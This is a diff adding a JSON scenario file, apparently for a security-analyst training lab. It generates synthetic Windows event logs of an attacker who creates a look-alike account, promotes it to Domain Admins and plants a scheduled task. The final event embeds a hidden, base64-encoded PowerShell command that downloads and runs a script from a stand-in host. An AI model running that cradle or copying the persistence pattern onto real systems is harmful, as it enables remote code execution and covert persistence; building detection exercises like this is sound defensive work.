@@ -1,0 +1,92 @@
+{
+  "id": "rogue-admin-persistence",
+  "name": "Rogue domain admin and scheduled-task persistence",
+  "summary": "Stolen administrator credentials are used to create a look-alike account, add it to Domain Admins and plant a hidden PowerShell scheduled task.",
+  "narrative": "An attacker who obtained the credentials of the IT admin account authenticates to the domain controller from the admin workstation. Within minutes a new account with an innocent-looking name is created, promoted to Domain Admins, and a scheduled task that runs an encoded PowerShell payload is registered on the ERP server.",
+  "category": "Persistence",
+  "level": "N2",
+  "expected_severity": "critical",
+  "expected_rules": ["LAB-007", "LAB-008", "LAB-011"],
+  "mitre": ["T1136.001", "T1098", "T1053.005", "T1078"],
+  "hosts": ["dc-01", "app-01"],
+  "learning_objectives": [
+    "Follow an account lifecycle across 4720 and 4728 events.",
+    "Recognise persistence through scheduled tasks and decode the payload.",
+    "Escalate severity when signals combine (new account + privileged group)."
+  ],
+  "investigation_questions": [
+    "Who created the new account and from which workstation?",
+    "How long after creation was the account promoted?",
+    "What does the scheduled task execute and what is the decoded command?",
+    "Is there an approved change that explains any of these actions?"
+  ],
+  "variables": {
+    "new_account": ["svc_update", "svc-sync", "helpdesk_adm", "sqlbackup"],
+    "task": ["\\Microsoft\\Windows\\Update\\UpdateCheck", "\\Microsoft\\Windows\\Maintenance\\SysHealth"]
+  },
+  "steps": [
+    {
+      "format": "windows_json",
+      "offset_seconds": 0,
+      "random_int": {"port": [49152, 65535]},
+      "record": {
+        "EventID": 4624, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
+        "EventData": {"TargetUserName": "adm.roliveira", "TargetDomainName": "CORP", "LogonType": "3",
+                      "IpAddress": "10.10.10.24", "IpPort": "{port}", "WorkstationName": "WS-IT-04",
+                      "AuthenticationPackageName": "Kerberos"}
+      }
+    },
+    {
+      "format": "windows_json",
+      "offset_seconds": 1,
+      "record": {
+        "EventID": 4672, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
+        "EventData": {"SubjectUserName": "adm.roliveira", "SubjectDomainName": "CORP",
+                      "PrivilegeList": "SeBackupPrivilege SeRestorePrivilege SeDebugPrivilege"}
+      }
+    },
+    {
+      "format": "windows_json",
+      "offset_seconds": 95,
+      "record": {
+        "EventID": 4720, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
+        "EventData": {"SubjectUserName": "adm.roliveira", "SubjectDomainName": "CORP",
+                      "TargetUserName": "{new_account}", "TargetDomainName": "CORP", "SamAccountName": "{new_account}"}
+      }
+    },
+    {
+      "format": "windows_json",
+      "offset_seconds": 110,
+      "record": {
+        "EventID": 4722, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
+        "EventData": {"SubjectUserName": "adm.roliveira", "SubjectDomainName": "CORP",
+                      "TargetUserName": "{new_account}", "TargetDomainName": "CORP"}
+      }
+    },
+    {
+      "format": "windows_json",
+      "offset_seconds": 160,
+      "record": {
+        "EventID": 4728, "TimeCreated": "{ts}", "Computer": "DC-01.corp.lab", "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
+        "EventData": {"SubjectUserName": "adm.roliveira", "SubjectDomainName": "CORP",
+                      "TargetUserName": "Domain Admins", "TargetDomainName": "CORP",
+                      "MemberName": "CN={new_account},CN=Users,DC=corp,DC=lab"}
+      }
+    },
+    {
+      "format": "windows_json",
+      "offset_seconds": 420,
+      "record": {
+        "EventID": 4698, "TimeCreated": "{ts}", "Computer": "APP-01.corp.lab", "Channel": "Security",
+        "Provider": "Microsoft-Windows-Security-Auditing", "Level": "Information",
+        "EventData": {"SubjectUserName": "{new_account}", "SubjectDomainName": "CORP", "TaskName": "{task}",
+                      "TaskContent": "<?xml version=\"1.0\" encoding=\"UTF-16\"?><Task><Triggers><BootTrigger/></Triggers><Actions><Exec><Command>C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Command><Arguments>-nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA4ADAALwB1AHAAZABhAHQAZQAuAHAAcwAxACcAKQA=</Arguments></Exec></Actions></Task>"}
+      }
+    }
+  ]
+}
